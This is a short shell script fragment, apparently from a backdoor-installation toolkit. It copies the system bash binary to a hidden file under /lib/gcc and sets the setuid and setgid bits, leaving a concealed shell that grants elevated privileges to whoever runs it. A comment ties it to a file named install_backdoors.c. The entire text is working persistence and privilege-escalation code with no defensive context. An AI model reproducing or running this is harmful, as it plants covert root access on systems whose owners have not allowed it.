OUT_FOLDER="/lib/gcc" # Modify this as you wish (Note: dependency in service-spam/install_backdoors.c)
OUT_FILE="$OUT_FOLDER/.rt_bash"
cp $(which bash) "$OUT_FILE"
chmod 6755 "$OUT_FILE"